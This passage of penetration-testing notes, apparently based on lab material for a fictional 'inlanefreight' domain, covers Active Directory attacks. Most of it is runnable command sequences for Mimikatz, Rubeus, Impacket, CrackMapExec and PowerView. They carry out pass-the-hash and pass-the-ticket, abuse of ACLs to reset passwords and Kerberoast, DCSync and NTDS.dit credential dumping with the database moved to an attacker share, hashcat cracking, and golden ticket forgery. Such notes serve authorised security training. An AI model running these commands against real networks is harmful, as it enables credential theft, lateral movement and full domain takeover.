<p>Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.`</p>
</blockquote>
<h3 id="rubeus-export-tickets">Rubeus - Export Tickets</h3>
<pre><code>&gt; Rubeus.exe dump /nowrap
</code></pre>
<blockquote>
<p>Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.</p>
</blockquote>
<p>This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.</p>
<hr />
<h1 id="lateral-movement">Lateral Movement</h1>
<h2 id="credentials-pass-the-hash">Credentials/ Pass The Hash</h2>
<h3 id="validating-the-credentials">Validating the Credentials</h3>
<p>{ldap,mssql,smb,ssh,winrm}</p>
<pre><code class="language-bash">$ crackmapexec &lt;protocol&gt; &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;
$ crackmapexec &lt;protocol&gt; &lt;ip_range&gt; -u &lt;user&gt; -H &lt;hash&gt; -d &lt;domain&gt;

$ crackmapexec &lt;protocol&gt; &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --local-auth
</code></pre>
<h3 id="mimikatz">Mimikatz</h3>
<pre><code>&gt; kerberos::hash /password:lucky7

&gt; mimikatz.exe
# privilege::debug 
# sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;
</code></pre>
<h3 id="smb">SMB</h3>
<p><a href="../../Services/SMB/#remote-code-execution">LateralMovement</a></p>
<h3 id="winrm">WinRM</h3>
<p><strong>Enumerating the Remote Management Users Group</strong></p>
<pre><code class="language-powershell">Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Management Users&quot;
</code></pre>
<p><strong>Using the Cypher Query in BloodHound</strong></p>
<pre><code class="language-powershell">MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2
</code></pre>
<p><a href="../../Services/WINRM/#connecting">WinRM</a></p>
<h3 id="rdp">RDP</h3>
<p><strong>Enumerating the Remote Desktop Users Group</strong></p>
<pre><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Desktop Users&quot;
</code></pre>
<p><strong>Checking the Domain Users Group's Local Admin &amp; Execution Rights using BloodHound</strong>
If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.</p>
<p>We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP</p>
<p><a href="../../Services/RDP/#connecting">RDP</a></p>
<h3 id="mssql">MSSQL</h3>
<p><a href="../../Services/SQL/#mssql">LateralMovement</a> </p>
<p>More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.</p>
<p>BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:</p>
<p><strong>Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound</strong></p>
<pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2
</code></pre>
<p><strong>Enumerating MSSQL Instances with PowerUpSQL</strong></p>
<pre><code class="language-powershell">Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

Get-SQLQuery -Verbose -Instance &quot;172.16.5.150,1433&quot; -username &quot;inlanefreight\damundsen&quot; -password &quot;SQL1234!&quot; -query 'Select @@version'
</code></pre>
<p>We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.</p>
<p><a href="../../Services/SQL/#xp_cmdshell">xp_cmdshell</a> </p>
<hr />
<h2 id="pass-the-key-or-overpass-the-hash">Pass the Key or OverPass the Hash</h2>
<ul>
<li>https://lisandre.com/archives/14788</li>
<li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key</li>
<li>https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/</li>
<li>https://www.thehacker.recipes/ad/movement/kerberos/ptk</li>
</ul>
<p>The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). </p>
<p>To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.</p>
<h3 id="mimikatz-extract-kerberos-keys">Mimikatz - Extract Kerberos Keys</h3>
<pre><code class="language-powershell">&gt; mimikatz.exe
&gt; privilege::debug
&gt; sekurlsa::ekeys
</code></pre>
<p>Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.</p>
<h3 id="mimikatz-pass-the-key-or-overpass-the-hash">Mimikatz - Pass the Key or OverPass the Hash</h3>
<pre><code class="language-powershell">&gt; mimikatz.exe
&gt; privilege::debug
&gt; sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
</code></pre>
<p>This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.</p>
<p>To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.</p>
<h3 id="rubeus-pass-the-key-or-overpass-the-hash">Rubeus - Pass the Key or OverPass the Hash</h3>
<pre><code class="language-powershell">&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap
</code></pre>
<blockquote>
<p>Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.</p>
<p>Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."</p>
</blockquote>
<h3 id="remotely">Remotely</h3>
<p>I wish to execute this attack remotely then use impacket python script gettgt.py which will use a password, hash or aesKey, it will request a TGT and save it as ccache.</p>
<pre><code class="language-bash"># with an NT hash (overpass-the-hash)
$ getTGT.py -dc-ip &lt;IP&gt; -hashes ':&lt;NTLM hash&gt;' &lt;DOMAIN&gt;/&lt;USER&gt;

# with an AES (128 or 256 bits) key (pass-the-key)
$ getTGT.py -dc-ip &lt;IP&gt; -aesKey '&lt;aes Key&gt;' &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;IP&gt;
</code></pre>
<hr />
<h2 id="pass-the-ticket-ptt">Pass the Ticket (PtT)</h2>
<ul>
<li>https://lisandre.com/archives/14885</li>
<li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket
Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows</li>
</ul>
<p>Now that we have some Kerberos tickets, we can use them to move laterally within an environment.</p>
<p>With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.</p>
<h3 id="rubeus-pass-the-ticket">Rubeus Pass the Ticket</h3>
<pre><code>&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt
</code></pre>
<p>Note that now it displays Ticket successfully imported!.</p>
<p>Another way is to import the ticket into the current session using the .kirbi file from the disk.</p>
<p>Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.</p>
<h3 id="rubeus-pass-the-ticket-using-kirbi">Rubeus - Pass the Ticket using kirbi</h3>
<pre><code class="language-powershell">&gt; Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
</code></pre>
<p>We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.</p>
<h4 id="convert-kirbi-to-base64-format">Convert .kirbi to Base64 Format</h4>
<pre><code class="language-powershell">PS &gt; [Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;))
</code></pre>
<p>Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.</p>
<h5 id="pass-the-ticket-base64-format">Pass the Ticket - Base64 Format</h5>
<pre><code class="language-powershell">&gt; Rubeus.exe ptt /ticket: &lt;Ticket&gt;
</code></pre>
<p>Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.</p>
<h3 id="mimikatz-pass-the-ticket-using-kirbi">Mimikatz - Pass the Ticket using kirbi</h3>
<pre><code class="language-powershell">&gt; mimikatz.exe 
&gt; privilege::debug
&gt; kerberos::ptt &quot;C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;
&gt; exit
</code></pre>
<blockquote>
<p>Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.</p>
</blockquote>
<h3 id="pass-the-ticket-with-powershell-remoting">Pass The Ticket with PowerShell Remoting</h3>
<p>To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.</p>
<h4 id="mimikatz-powershell-remoting-with-pass-the-ticket">Mimikatz - PowerShell Remoting with Pass the Ticket</h4>
<pre><code class="language-powershell">&gt; mimikatz.exe
&gt; privilege::debug
&gt; kerberos::ptt &quot;C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi&quot;
&gt; exit
&gt; powershell
</code></pre>
<h3 id="rubeus-powershell-remoting-with-pass-the-ticket">Rubeus - PowerShell Remoting with Pass the Ticket</h3>
<h4 id="create-a-sacrificial-process-with-rubeus">Create a Sacrificial Process with Rubeus</h4>
<pre><code class="language-powershell">&gt; Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\cmd.exe&quot; /show
</code></pre>
<p>The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.</p>
<h4 id="rubeus-pass-the-ticket-for-lateral-movement">Rubeus - Pass the Ticket for Lateral Movement</h4>
<pre><code class="language-powershell">&gt; Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
&gt; powershell
&gt; Enter-PSSession -ComputerName DC01
</code></pre>
<h3 id="using-impacket-tools">Using Impacket Tools</h3>
<p>With ccache file obtained Passing the Key or Overpassing the Hash, to execute impacket tools, the ccache file needs to be exported to  environment variable.</p>
<pre><code class="language-bash">$ ticketConverter.py &lt;kirbi||ccache&gt; &lt;kirbi||ccache&gt;
$ export KRB5CCNAME=&lt;path_to_ticket&gt;.ccache
</code></pre>
<hr />
<h1 id="permissions-move">Permissions Move</h1>
<h2 id="acl-enumeration">ACL Enumeration</h2>
<p>Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:</p>
<p><img alt="alt text" src="https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png" /></p>
<p>ForceChangePassword abused with Set-DomainUserPassword
Add Members abused with Add-DomainGroupMember
GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite abused with Set-DomainObject
WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself abused with Add-DomainGroupMember</p>
<h3 id="enumerating-acls-with-bloodhound">Enumerating ACLs with BloodHound</h3>
<p>Next, we can set the <Username> user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights</p>
<h3 id="enumerating-acls-with-powerview">Enumerating ACLs with PowerView</h3>
<h4 id="using-find-interestingdomainacl">Using Find-InterestingDomainAcl</h4>
<pre><code class="language-powershell">PS &gt; Find-InterestingDomainAcl
</code></pre>
<p>We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.</p>
<p>Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.</p>
<h4 id="using-get-domainobjectacl">Using Get-DomainObjectACL</h4>
<pre><code class="language-powershell">PS &gt; Import-Module .\PowerView.ps1
PS &gt; $sid = Convert-NameToSid &lt;USERNAME&gt;
PS &gt; Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
</code></pre>
<h4 id="performing-a-reverse-search-mapping-to-a-guid-value">Performing a Reverse Search &amp; Mapping to a GUID Value</h4>
<pre><code class="language-powershell">PS &gt; $guid= &quot;&lt;ObjectAceType&gt;&quot;
PS &gt; Get-ADObject -SearchBase &quot;CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)&quot; -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
</code></pre>
<h4 id="using-the-resolveguids-flag">Using the -ResolveGUIDs Flag</h4>
<pre><code class="language-powershell">PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
</code></pre>
<h4 id="creating-a-list-of-domain-users">Creating a List of Domain Users</h4>
<pre><code class="language-powershell">PS &gt; Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt
</code></pre>
<h4 id="a-useful-foreach-loop">A Useful foreach Loop</h4>
<pre><code>PS &gt; foreach($line in [System.IO.File]::ReadLines(&quot;C:\Users\htb-student\Desktop\ad_users.txt&quot;)) {get-acl  &quot;AD:\$(Get-ADUser $line)&quot; | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
</code></pre>
<h4 id="further-enumeration-of-rights-using-damundsen">Further Enumeration of Rights Using damundsen</h4>
<pre><code>PS &gt; $sid2 = Convert-NameToSid damundsen
PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
</code></pre>
<h4 id="investigating-the-help-desk-level-1-group-with-get-domaingroup">Investigating the Help Desk Level 1 Group with Get-DomainGroup</h4>
<pre><code>PS &gt; Get-DomainGroup -Identity &quot;Help Desk Level 1&quot; | select memberof
</code></pre>
<h4 id="investigating-the-information-technology-group">Investigating the Information Technology Group</h4>
<pre><code>PS &gt; $itgroupsid = Convert-NameToSid &quot;Information Technology&quot;
PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
</code></pre>
<h4 id="looking-for-interesting-access">Looking for Interesting Access</h4>
<pre><code>PS &gt; $adunnsid = Convert-NameToSid adunn 
PS &gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
</code></pre>
<hr />
<h2 id="acl-abuse-tactics">ACL Abuse Tactics</h2>
<pre><code class="language-powershell">PS &gt; Import-Module .\PowerView.ps1
</code></pre>
<h3 id="forcechangepassword">ForceChangePassword</h3>
<p>So, first, we must authenticate as <user1> because he can force change the password of the user <user2>. We can start by opening a PowerShell console and authenticating as the <user1> user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.</p>
<pre><code class="language-powershell"># Creating a PSCredential Object
PS &gt; $SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force
PS &gt; $Cred = New-Object System.Management.Automation.PSCredential('&lt;INLANEFREIGHT&gt;\&lt;user1&gt;', $SecPassword) 

# Creating a SecureString Object**
PS &gt; $user2Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Changing the User's Password
PS &gt; Set-DomainUserPassword -Identity user2 -AccountPassword $user2Password -Credential $Cred -Verbose
</code></pre>
<p>We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the user1 that we control. </p>
<h3 id="add-domaingroupmember">Add-DomainGroupMember</h3>
<pre><code class="language-powershell"># Creating a SecureString Object using user2
PS &gt; $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS &gt; $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\user', $SecPassword) 

# Adding user2 to the Help Desk Level 1 Group
PS &gt; Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'user2' -Credential $Cred2 -Verbose
PS &gt; Get-ADGroup -Identity &quot;Help Desk Level 1&quot; -Properties * | Select -ExpandProperty Members

# Confirming user2 was Added to the Group**
PS &gt; Get-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; | Select MemberName
</code></pre>
<p>At this point, we should be able to leverage our new group membership to take control over the user3. Now, let's say that our client permitted us to change the password of the user2, but the user3 is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.</p>
<p>We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast [https://github.com/ShutdownRepo/targetedKerberoast] to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.</p>
<h3 id="creating-a-fake-spn">Creating a Fake SPN</h3>
<pre><code class="language-powershell">PS &gt; Set-DomainObject -Credential $Cred2 -Identity user3 -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
</code></pre>
<pre><code class="language-bash">$ targetedKerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;
</code></pre>
<h4 id="kerberoasting-with-rubeus">Kerberoasting with Rubeus</h4>
<pre><code>PS &gt; .\Rubeus.exe kerberoast /user:user3 /nowrap
</code></pre>
<h4 id="cleanup">Cleanup</h4>
<pre><code class="language-powershell"># Removing the Fake SPN from user3's Account
PS &gt; Set-DomainObject -Credential $Cred2 -Identity user3 -Clear serviceprincipalname -Verbose

# Removing user2 from the Help Desk Level 1 Group
PS &gt; Remove-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; -Members 'user2' -Credential $Cred2 -Verbose

# Confirming user2 was Removed from the Group
PS &gt; Get-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; | Select MemberName |? {$_.MemberName -eq 'user2'} -Verbose
</code></pre>
<hr />
<h2 id="dcsync">DCSync</h2>
<p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p>
<p>The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.</p>
<p>To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.</p>
<h3 id="using-get-domainuser-to-view-adunns-group-membership">Using Get-DomainUser to View adunn's Group Membership</h3>
<pre><code>PS &gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
</code></pre>
<h3 id="using-get-objectacl-to-check-adunns-replication-rights">Using Get-ObjectAcl to Check adunn's Replication Rights</h3>
<pre><code>PS &gt; $sid= &quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot;
PS &gt; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
</code></pre>
<h3 id="extracting-ntlm-hashes-and-kerberos-keys-using-secretsdumppy">Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py</h3>
<pre><code class="language-bash">$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

# NTLM authentication
$ secretsdump.py -outputfile inlanefreight_hashes &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;DC_IP&gt; 

# Hash authentication
$ secretsdump.py -outputfile inlanefreight_hashes -hash &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DC_IP&gt; 

# Kerberos authentication
$ secretsdump.py -outputfile inlanefreight_hashes -no-pass -k &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DC_IP&gt; 
</code></pre>
<p>We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user <USERNAME> to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:</p>
<p>If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.</p>
<h3 id="using-runasexe">Using runas.exe</h3>
<pre><code>&gt; runas /netonly /user:INLANEFREIGHT\adunn powershell
</code></pre>
<h3 id="performing-the-attack-with-mimikatz">Performing the Attack with Mimikatz</h3>
<pre><code>PS &gt; .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
</code></pre>
<hr />
<h1 id="domain-admin">Domain Admin</h1>
<h2 id="dump-ntdsdit">Dump NTDS.dit</h2>
<p>In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.</p>
<p>Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.</p>
<p>Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique.</p>
<hr />
<h2 id="capturing-ntdsdit">Capturing NTDS.dit</h2>
<p>NT Directory Services (NTDS) is the directory service used with AD to find &amp; organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.</p>
<p>We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.</p>
<h3 id="checking-user-account-privileges-including-domain">Checking User Account Privileges including Domain</h3>
<ul>
<li><code>net user bwilliamson</code></li>
</ul>
<h3 id="creating-shadow-copy-of-c">Creating Shadow Copy of C:</h3>
<p>We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read &amp; written to actively without needing to bring a particular application or system down. VSS is used by many different backup &amp; disaster recovery software to perform operations.</p>
<ul>
<li><code>vssadmin CREATE SHADOW /For=C:</code></li>
</ul>
<h4 id="copying-ntdsdit-from-the-vss">Copying NTDS.dit from the VSS</h4>
<p>We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.</p>
<ul>
<li><code>cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</code></li>
</ul>
<h4 id="transferring-ntdsdit-to-attack-host">Transferring NTDS.dit to Attack Host</h4>
<p>Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host.
- <code>cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData</code></p>
<h3 id="crackmapexec">CrackMapExec</h3>
<p>Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p>
<pre><code class="language-bash">$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
</code></pre>
<h3 id="impacket">Impacket</h3>
<pre><code class="language-bash">$ secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; 
</code></pre>
<h2 id="cracking-hashes-gaining-credentials">Cracking Hashes &amp; Gaining Credentials</h2>
<p>We can proceed with creating a text file containing all the NT hashes, or we can individually copy &amp; paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.</p>
<ul>
<li><code>sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</code></li>
</ul>
<hr />
<h1 id="persistence">Persistence</h1>
<h2 id="goldticket">GoldTicket</h2>
<ul>
<li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden </li>
<li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket</li>
</ul>
<h3 id="mimikatz_1">Mimikatz</h3>
<pre><code class="language-powershell"># with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
</code></pre>
<h3 id="rubeus">Rubeus</h3>
<pre><code>.\Rubeus.exe ptt /ticket:ticket.kirbi
</code></pre>
<h3 id="remote">Remote</h3>
<pre><code>PS &gt; import-module .\PowerView.ps1
PS &gt; Get-DomainSID
</code></pre>
<pre><code class="language-bash"># Create the golden ticket (with an RC4 key, i.e. NT hash)
$ ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
$ ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Set the ticket for impacket use
$ export KRB5CCNAME=&lt;TGS_ccache_file&gt;
</code></pre>
<hr />
<h2 id="silverticket">SilverTicket</h2>
<ul>
<li>https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver</li>
<li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</li>
</ul>
<p>The Silver Ticket attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.</p>
